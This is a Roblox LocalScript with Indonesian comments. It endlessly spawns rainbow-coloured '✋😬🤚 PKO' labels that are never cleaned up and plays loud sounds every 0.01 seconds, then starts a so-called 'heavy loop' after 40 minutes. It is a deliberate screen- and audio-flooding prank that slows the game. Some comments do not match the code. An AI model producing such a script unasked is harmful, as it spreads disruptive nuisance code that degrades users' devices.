-- LocalScript: Spam GUI + Suara ✋😬🤚 PKO)
local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Fungsi untuk membuat GUI label spam
local function createSpamLabel()
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(0, 200, 0, 50)
    textLabel.Position = UDim2.new(math.random(), -100, math.random(), -25)
    textLabel.Text = "✋😬🤚 PKO"
    textLabel.TextScaled = true
    textLabel.Font = Enum.Font.SourceSansBold
    textLabel.BackgroundTransparency = 1
    textLabel.TextColor3 = Color3.new(1, 1, 1)

    local screenGui = playerGui:FindFirstChild("PKOGui")
    if not screenGui then
        screenGui = Instance.new("ScreenGui")
        screenGui.Name = "PKOGui"
        screenGui.ResetOnSpawn = false
        screenGui.Parent = playerGui
    end

    textLabel.Parent = screenGui
    return textLabel
end

-- Warna rainbow
local rainbowColors = {
    Color3.fromRGB(255, 0, 0),
    Color3.fromRGB(255, 127, 0),
    Color3.fromRGB(255, 255, 0),
    Color3.fromRGB(0, 255, 0),
    Color3.fromRGB(0, 0, 255),
    Color3.fromRGB(75, 0, 130),
    Color3.fromRGB(148, 0, 211)
}

-- Animasi label (rainbow + gerak)
local function animateLabel(label)
    task.spawn(function()
        local i = 1
        while label.Parent do
            label.TextColor3 = rainbowColors[i]
            i = i + 1
            if i > #rainbowColors then i = 1 end

            local posX = math.random()
            local posY = math.random()
            label.Position = UDim2.new(posX, -100, posY, -25)

            task.wait(0.1)
        end
    end)
end

-- Fungsi untuk memutar suara spam
local function playSpamSound()
    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://3779045779"
    sound.Volume = 10
    sound.PlaybackSpeed = math.random(0.5, 2) -- pitch acak 0.5x sampai 2x
    sound.Parent = workspace
    sound:Play()
    game:GetService("Debris"):AddItem(sound, 5) -- auto hapus setelah 5 detik
end

-- 1. Spam GUI + suara
task.spawn(function()
    while true do
        local label = createSpamLabel()
        animateLabel(label)
        playSpamSound()
        task.wait(0.01) -- spam tiap 0.2 detik
    end
end)

-- 2. Loop berat setelah 40 menit
task.delay(40 * 60, function()
    while true do
        for i = 1, 1 do
            local v = math.sqrt(i) * math.random()
        end
        task.wait()
    end
end)
